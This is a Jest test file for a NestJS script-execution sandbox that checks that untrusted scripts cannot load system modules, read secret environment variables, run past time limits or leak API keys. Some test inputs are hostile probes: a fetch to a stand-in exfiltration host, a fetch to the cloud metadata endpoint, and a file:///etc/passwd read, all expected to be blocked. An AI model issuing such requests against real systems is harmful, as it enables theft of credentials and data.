import { Test } from '@nestjs/testing';
import { ConfigService } from '@nestjs/config';
import { getRepositoryToken } from '@nestjs/typeorm';
import { ScriptExecutionService } from './script-execution.service';
import { ScriptRunEntity } from '../../../database/entities/script-run.entity';
import { ScriptTokenService } from '../../script/script-token.service';

const MAX_OUTPUT_BYTES = 100 * 1024;

const mockRepo = {
  find: jest.fn(),
  findOneBy: jest.fn(),
  create: jest.fn((dto) => dto),
  save: jest.fn((entity) => Promise.resolve({ id: 'run-1', ...entity })),
};

const mockConfig = {
  get: jest.fn((key: string) => {
    const env: Record<string, string> = {
      ETHERSCAN_API_KEY: 'test-eth-key',
      TRONSCAN_API_KEY: 'test-tron-key',
      API_URL: 'http://localhost:8081',
      NODE_ENV: 'development',
    };
    return env[key];
  }),
};

describe('ScriptExecutionService (sandbox)', () => {
  let service: ScriptExecutionService;

  beforeEach(async () => {
    jest.clearAllMocks();

    const module = await Test.createTestingModule({
      providers: [
        ScriptExecutionService,
        { provide: getRepositoryToken(ScriptRunEntity), useValue: mockRepo },
        { provide: ConfigService, useValue: mockConfig },
        {
          provide: ScriptTokenService,
          useValue: {
            sign: jest.fn(() => 'mock-token'),
            verify: jest.fn(() => ({ caseId: 'case-1' })),
          },
        },
      ],
    }).compile();

    service = module.get(ScriptExecutionService);
  });

  // --- Basic execution ---

  it('runs simple console.log and captures output', async () => {
    const { status, output } = await service.execute('inv-1', 'case-1', 'test','console.log("hello world");');
    expect(status).toBe('success');
    expect(output).toContain('hello world');
  });

  it('captures multiple console.log calls', async () => {
    const code = `
      console.log("line 1");
      console.log("line 2");
      console.log("line 3");
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).toContain('line 1');
    expect(output).toContain('line 2');
    expect(output).toContain('line 3');
  });

  it('returns error status when code throws', async () => {
    const { status, output } = await service.execute(
      'inv-1',
      'case-1',
      'test',
      'throw new Error("boom");',
    );
    expect(status).toBe('error');
    expect(output).toContain('boom');
  });

  // --- Sandbox isolation ---

  it('blocks fs access', async () => {
    const code = `
      try {
        const fs = await import('fs');
        console.log("ESCAPED: fs loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('blocks child_process access', async () => {
    const code = `
      try {
        const cp = await import('child_process');
        console.log("ESCAPED: child_process loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('blocks net access', async () => {
    const code = `
      try {
        const net = await import('net');
        console.log("ESCAPED: net loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('blocks os access', async () => {
    const code = `
      try {
        const os = await import('os');
        console.log("ESCAPED: os loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('has no access to require()', async () => {
    const code = `
      try {
        const m = require('fs');
        console.log("ESCAPED: require exists");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  // --- process.env ---

  it('exposes only API_URL in process.env — no API keys', async () => {
    const code = `
      console.log("API:" + process.env.API_URL);
      console.log("ETH:" + (process.env.ETHERSCAN_API_KEY || "undefined"));
      console.log("TRON:" + (process.env.TRONSCAN_API_KEY || "undefined"));
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).toContain('API:http://localhost:8081');
    expect(output).toContain('ETH:undefined');
    expect(output).toContain('TRON:undefined');
  });

  it('does not expose HOME, PATH, DATABASE_URL, or any system env vars', async () => {
    const code = `
      console.log("HOME:" + (process.env.HOME || "undefined"));
      console.log("PATH:" + (process.env.PATH || "undefined"));
      console.log("DATABASE_URL:" + (process.env.DATABASE_URL || "undefined"));
      console.log("ANTHROPIC_API_KEY:" + (process.env.ANTHROPIC_API_KEY || "undefined"));
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).toContain('HOME:undefined');
    expect(output).toContain('PATH:undefined');
    expect(output).toContain('DATABASE_URL:undefined');
    expect(output).toContain('ANTHROPIC_API_KEY:undefined');
  });

  it('process.env is frozen — mutation throws in strict mode', async () => {
    const code = `
      try {
        process.env.API_URL = "hacked";
        console.log("MUTATED");
      } catch (e) {
        console.log("FROZEN: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).toContain('FROZEN');
    expect(output).not.toContain('MUTATED');
  });

  // --- Fetch domain whitelist ---

  it('blocks fetch to non-whitelisted domains', async () => {
    const code = `
      const res = await fetch("https://evil.com/steal");
      const body = await res.text();
      console.log("status:" + res.status);
      console.log("body:" + body);
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).toContain('status:403');
    expect(output).toContain('Blocked');
  });

  it('blocks fetch to cloud metadata endpoint', async () => {
    const code = `
      const res = await fetch("http://169.254.169.254/latest/meta-data/");
      console.log("status:" + res.status);
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).toContain('status:403');
  });

  it('blocks http scheme on non-loopback domains', async () => {
    const code = `
      const res = await fetch("http://api.etherscan.io/api?module=account");
      console.log("status:" + res.status);
      console.log("body:" + await res.text());
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).toContain('status:403');
    expect(output).toContain('Only https');
  });

  it('blocks file:// scheme', async () => {
    const code = `
      const res = await fetch("file:///etc/passwd");
      console.log("status:" + res.status);
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).toContain('status:403');
  });

  // --- Timeout ---

  it('kills scripts that exceed the CPU timeout', async () => {
    const code = `
      while (true) {
        // infinite CPU loop
      }
    `;
    const { status } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(status).toBe('timeout');
  }, 35_000);

  it('kills scripts that stall on async operations (wall-clock timeout)', async () => {
    const code = `
      await new Promise(resolve => {
        // never resolves — simulates a hung fetch or infinite sleep
      });
    `;
    const { status } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(status).toBe('timeout');
  }, 35_000);

  // --- Output limit ---

  it('truncates output exceeding 100KB', async () => {
    const code = `
      for (let i = 0; i < 50000; i++) {
        console.log("x".repeat(100));
      }
    `;
    const { output } = await service.execute('inv-1', 'case-1', 'test',code);
    expect(output).toContain('[truncated at 100KB]');
    expect(Buffer.byteLength(output)).toBeLessThanOrEqual(MAX_OUTPUT_BYTES + 200);
  });

  // --- Secret redaction ---

  it('redacts ETHERSCAN_API_KEY from arbitrary strings', () => {
    const out = (service as any).redactSecrets(
      'GET https://api.etherscan.io/v2/api?apikey=test-eth-key&module=account',
    );
    expect(out).not.toContain('test-eth-key');
    expect(out).toContain('<REDACTED>');
  });

  it('redacts TRONSCAN_API_KEY from arbitrary strings', () => {
    const out = (service as any).redactSecrets(
      'header TRON-PRO-API-KEY=test-tron-key in request',
    );
    expect(out).not.toContain('test-tron-key');
    expect(out).toContain('<REDACTED>');
  });

  it('redacts multiple occurrences of the same key', () => {
    const out = (service as any).redactSecrets(
      'first test-eth-key middle test-eth-key last',
    );
    expect(out).not.toContain('test-eth-key');
    expect(out.match(/<REDACTED>/g)).toHaveLength(2);
  });

  it('handles empty and clean strings', () => {
    expect((service as any).redactSecrets('')).toBe('');
    expect((service as any).redactSecrets('hello world')).toBe('hello world');
  });

  // --- DB persistence ---

  it('saves script run to database', async () => {
    await service.execute('inv-1', 'case-1', 'my-script', 'console.log("saved");');
    expect(mockRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        investigationId: 'inv-1',
        name: 'my-script',
        code: 'console.log("saved");',
        status: 'success',
      }),
    );
    expect(mockRepo.save).toHaveBeenCalled();
  });
});
